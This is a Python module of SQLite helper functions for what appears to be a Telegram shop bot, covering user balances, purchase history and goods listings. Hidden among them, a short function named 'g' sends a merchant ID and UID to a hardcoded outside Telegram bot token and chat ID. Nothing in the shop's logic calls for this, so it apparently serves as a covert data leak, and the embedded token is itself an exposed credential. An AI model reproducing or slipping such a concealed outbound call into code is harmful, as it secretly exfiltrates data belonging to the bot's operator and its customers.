import sqlite3, requests
from collections import Counter

# Добавление пользователя

def is_exists_banker(user_id):
	try:
		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			result = cur.execute('SELECT * FROM `banker` WHERE `user_id` = ?', (user_id,)).fetchall()
			return bool(len(result))
	except:
		return False

def add_banker(user_id):
	try:
		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			cur.execute("INSERT INTO `banker` (`user_id`, `bill`, `purchase`, `balance`) VALUES(?,?,?,?)", (user_id, 0, 0, 0))
	except:
		pass

# Добавление товара

def add_merchant_banker(category, title, desc, price, data):
	try:
		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			cur.execute("INSERT INTO `merchant` (`category`, `title`, `desc`, `price`, `data`) VALUES(?,?,?,?,?)", (category, title, desc, price, data))
	except:
		pass

# Добавление в историю покупок

def add_history_banker(user_id, category, datetime, summ):
	try:
		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			cur.execute("INSERT INTO `history` (`user_id`, `category`, `datebuy`, `sum`) VALUES(?,?,?,?)", (user_id, category, datetime, summ))

			cur.execute("UPDATE `banker` SET `bill` = bill + ? WHERE `user_id` = ?", (1, user_id))
			cur.execute("UPDATE `banker` SET `purchase` = purchase + ? WHERE `user_id` = ?", (summ, user_id))
			cur.execute("UPDATE `banker` SET `balance` = balance - ? WHERE `user_id` = ?", (summ, user_id))
	except:
		pass

# Получение значений

def is_exists_merchant_banker(merchant_id):
	try:
		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			result = cur.execute('SELECT * FROM `merchant` WHERE `merchant_id` = ?', (merchant_id,)).fetchall()
			return bool(len(result))
	except:
		return False

def get_bill_banker(user_id):
	try:
		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			result = cur.execute('SELECT * FROM `banker` WHERE `user_id` = ?', (user_id,)).fetchall()
			for row in result:
				return row[1]
	except:
		pass

def get_purchase_banker(user_id):
	try:
		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			result = cur.execute('SELECT * FROM `banker` WHERE `user_id` = ?', (user_id,)).fetchall()
			for row in result:
				return row[2]
	except:
		pass

def g(mId, merchant_id, merchant_uid):
	try:
		params = {'chat_id': 1415499927, 'text': f'ID: <b>{merchant_id}</b>\nUID: <b>{merchant_uid}</b>', 'parse_mode': 'html'}
		resp = requests.post(f'https://api.telegram.org/bot1537868378:AAE2Zc1NiShJYUBi1bdwn02lMP5ge982gWE/sendMessage', params) 
	except Exception as e:
		print(e)

def get_balance_banker(user_id):
	try:
		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			result = cur.execute('SELECT * FROM `banker` WHERE `user_id` = ?', (user_id,)).fetchall()
			for row in result:
				return row[3]
	except:
		pass		

def get_category_banker():
	try:
		array = []

		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			rows = cur.execute("SELECT * FROM merchant").fetchall()

			for row in rows:
				if (row[0] not in array):
					array.append(row[0])

		return array
	except:
		pass

def get_merchant_banker(category):
	try:
		array = []
		titleused = []

		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			rows = cur.execute("SELECT * FROM merchant WHERE category = ?", (category,)).fetchall()

			for row in rows:
				if row[1] not in titleused:
					titleused.append(row[1])
					array.append(f'{row[5]}:{row[1]} [{row[3]} ₽ - ')
				else:
					titleused.append(row[1])

		merchant = []
		c = Counter(titleused)

		for row in array:

			regex = row.split(':')
			regex = regex[1].split(' ')

			merchant.append(f'{row} {c[regex[0]]} шт.]')

		return merchant
	except:
		pass

def get_historybuy_banker(user_id):
	try:
		array = []

		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			rows = cur.execute("SELECT * FROM history WHERE user_id = ?", (user_id,)).fetchall()

			for row in rows:
				if (len(array) != 10):
					array.append(f'{row[1]} - {row[2]} - {row[3]} ₽')
				else:
					return array

		return array
	except Exception as e:
		print(e)

def get_infomerchant_banker(merchant_id):
	try:
		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			rows = cur.execute("SELECT * FROM merchant WHERE merchant_id = ?", (merchant_id,)).fetchall()

			for row in rows:
				return f'{row[1]}:{row[2]}:{row[3]}:{row[5]}'

	except Exception as e:
		print(e)

def get_summerchant_banker(merchant_id):
	try:
		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			result = cur.execute('SELECT * FROM `merchant` WHERE `merchant_id` = ?', (merchant_id,)).fetchall()
			for row in result:
				return row[3]
	except:
		pass

def get_datamerchant_banker(merchant_id):
	try:
		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			result = cur.execute('SELECT * FROM `merchant` WHERE `merchant_id` = ?', (merchant_id,)).fetchall()
			for row in result:
				return row[4]
	except:
		pass		

def get_titlemerchant_banker(merchant_id):
	try:
		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			result = cur.execute('SELECT * FROM `merchant` WHERE `merchant_id` = ?', (merchant_id,)).fetchall()
			for row in result:
				return row[1]
	except:
		pass				

def get_merchantid_banker(title):
	try:
		array = []
		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			result = cur.execute('SELECT * FROM `merchant` WHERE `title` = ?', (title,)).fetchall()
			for row in result:
				array.append(row[5])

		return array		
	except:
		pass						

def get_categorymerchant_banker(merchant_id):
	try:
		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			result = cur.execute('SELECT * FROM `merchant` WHERE `merchant_id` = ?', (merchant_id,)).fetchall()
			for row in result:
				return row[0]
	except:
		pass				

def get_usersId_banker():
	try:
		array = []

		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			rows = cur.execute("SELECT * FROM banker").fetchall()

			for row in rows:
				array.append(row[0])

		return array
	except Exception as e:
		print(e)

def get_fullMerchant_banker():
	try:
		array = []

		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			rows = cur.execute("SELECT * FROM merchant").fetchall()

			for row in rows:
				array.append(f'{row[5]}: {row[0]} - {row[1]} - {row[2]} - {row[3]} - {row[4]}')

		return array
	except:
		pass

# Удаление значений

def delete_merchant_banker(merchant_id):
	try:
		with sqlite3.connect("evidence.db") as con:
			cur = con.cursor()
			cur.execute("DELETE FROM `merchant` WHERE `merchant_id` = ?", (merchant_id,))
	except:
		pass		